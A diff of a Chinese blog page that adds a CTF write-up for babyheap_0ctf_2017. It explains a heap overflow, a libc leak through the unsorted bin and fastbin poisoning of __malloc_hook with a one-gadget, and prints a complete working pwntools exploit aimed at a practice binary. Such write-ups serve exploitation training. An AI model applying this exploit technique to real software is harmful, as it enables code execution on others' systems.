@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.7.6">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/archives/2022/10/"/>
+  
+  <link rel="canonical" href="http://example.com/2022/11/14/babyheap-0ctf-2017/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,17 +31,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Archive: 2022/10 - Chen</title>
+  <title>babyheap_0ctf_2017 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="Chen">
-<meta property="og:url" content="http://example.com/archives/2022/10/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="babyheap_0ctf_2017">
+<meta property="og:url" content="http://example.com/2022/11/14/babyheap-0ctf-2017/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="ChenBlog">
+<meta property="og:description" content="查看一下保护机制 12345Arch:     amd64-64-littleRELRO:    Full RELROstack:    Canary foundNX:       NX enabledPIE:      PIE enabled  FULL RELRO要注意一下 ida反编译一下 1234567891011121314151617181920212223242526272829__">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2022-11-14T01:24:11.000Z">
+<meta property="article:modified_time" content="2022-11-14T01:50:44.850Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2042,7 +2044,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2311,7 +2313,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  search' style="display: ;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://s1.ax1x.com/2022/11/11/zCx6gA.png"></div>
 
@@ -2359,36 +2361,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/12/fini劫持/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/14/babyheap-0ctf-2017/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2397,545 +2371,266 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="ChenBlog">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/10/12/fini%E5%8A%AB%E6%8C%81/"  itemprop="url">
-        fini劫持
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      
-        基础概念
-一个程序在执行的时候 其并不是直接执行main函数
-先是执行入口函数
-入口函数对运行库和程序运行环境进行初始化，包括堆、I&#x2F;O、线程、全局变量的构造等等
-在完成初始化之后，调用main函数，正式开始执行函数主体部分
-main函数执行完毕之后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁、关闭I&#x2F;O等，然后进行系统调用结束进程
-这里不具体到各个入...
-      
+    
+      <h1 class="title" itemprop="name headline">
+        babyheap_0ctf_2017
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/wp/">wp</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/wp/" itemprop="url"><span itemprop="name">wp</span></a>
+      </span>
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-10-12T16:05:30+08:00">2022-10-12</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
+
+
           
         
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-14T09:24:11+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Nov 14, 2022</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <p>查看一下保护机制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>FULL RELRO要注意一下</p>
+<p>ida反编译一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( choice() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        delete(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        print(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要留意的是释放堆块的时候 指针也置零了 没有办法uaf</p>
+<p>但是edit可以进行堆溢出</p>
+<p>题目docker环境为16.04 那么显而易见 有输出函数以及堆溢出的机会</p>
+<p>这里用到unsortedbin泄露基址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#前置exp:</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25931</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+
+<p>先申请一个chunk0 用于堆溢出覆盖chunk1的size域 从而使chunk1和chunk2合并</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3   #chunk3的作用则是防止堆块释放后和top chunk合并</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p>gdb看一下此时堆块结构</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zkcynA"><img src="https://s1.ax1x.com/2022/11/14/zkcynA.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/14/zkcynA.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zkcynA.png"></a></p>
+<p>可以看到已经成功合并了chunk1和chunk2</p>
+<p>此时我们free掉chunk1</p>
+<p>该合并堆块就会进入到unsortedbin</p>
+<p>此时其fd和bk就指向了main_arena+88</p>
+<p>我们如果再申请一个0x68大小的chunk</p>
+<p>此时bin将会把前半部分的堆块分配出来</p>
+<p>于是fd和bk的内容我们就可以通过print新申请的堆块打印出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3&amp;1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>还差一点 要如果才能确定偏移 从而计算出libc基址</p>
+<p>这里我们进行gdb动调 我们需要求出main_arena+88和libc基址的偏移</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zkgCH1"><img src="https://s1.ax1x.com/2022/11/14/zkgCH1.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/14/zkgCH1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zkgCH1.png"></a></p>
+<p>则可求得 偏移 &#x3D; 0x7f35f3b9bb78-0x7f35f37d7000</p>
+<p>由于开启了FULL RELRO 我们并没有办法篡改got表</p>
+<p>但是此时是ubuntu16.04版本环境 我们想到了使用malloc_hook的攻击方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_addr = addr - (<span class="number">0x7fc2d9938b78</span>-<span class="number">0x7fc2d9574000</span>)</span><br><span class="line">malloc_hook = libc_addr+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>此时我们再次申请一个大小为0x68的chunk 它会分配到剩下一半的unsortedbin的空间</p>
+<p>但是你要注意到 chunk2的指针不是还没被置零吗 chunk2和我们新申请到的chunk指向了同一片空间</p>
+<p>这不就可以做到uaf吗 于是我们再次释放chunk2 然后编辑chunk4的内容 覆盖chunk2的fd域 就可以使我们目标地址串连到fastbin上</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4&amp;2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(malloc_hook)),p64(malloc_hook-<span class="number">0x23</span>))</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zkgrCT"><img src="https://s1.ax1x.com/2022/11/14/zkgrCT.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/14/zkgrCT.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zkgrCT.png"></a></p>
+<p>此时我们连续申请两个堆块 第二个堆块就是分配到对应地址的空间</p>
+<p>此时我们编辑第二个堆块 覆盖malloc_hook为onegadget地址</p>
+<p>这样我们在申请新chunk时系统调用malloc函数时就会调用onegadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4 </span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5 </span></span><br><span class="line">onegadget = <span class="number">0x4526a</span>+libc_addr  <span class="comment">#0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">payload = cyclic(<span class="number">0x8</span>+<span class="number">0xb</span>)+p64(onegadget)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25931)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3&amp;1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = addr - (<span class="number">0x7fc2d9938b78</span>-<span class="number">0x7fc2d9574000</span>)</span><br><span class="line">malloc_hook = libc_addr+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4&amp;2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(malloc_hook)),p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4 </span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5 </span></span><br><span class="line">onegadget = <span class="number">0x4526a</span>+libc_addr  <span class="comment">#0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">payload = cyclic(<span class="number">0x8</span>+<span class="number">0xb</span>)+p64(onegadget)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2022/10/12/fini%E5%8A%AB%E6%8C%81/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-14T09:50:44+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Nov 14, 2022</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/12/格式化字符串任意写-泄露基址/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chen">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="Chen">
-    <meta itemprop="description" content="ChenBlog">
-  </span>
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/11/14/babyheap-0ctf-2017/&title=babyheap_0ctf_2017 - Chen&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/11/14/babyheap-0ctf-2017/&title=babyheap_0ctf_2017 - Chen&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/11/14/babyheap-0ctf-2017/&title=babyheap_0ctf_2017 - Chen&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
   
+
   
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2022/11/13/vscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/'>
+          <p class='title'>vscode远程连接<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>先把虚拟机需要的环境配置一下
+1sudo apt install openssh-server
+
+1sudo apt install curl
+
+接着在物理机上创建一下ssh密匙
+1ssh-ke...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2022/11/14/babyheap-0ctf-2017/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/"  itemprop="url">
-        格式化字符串任意写&泄露基址
-      </a>
-    </h2>
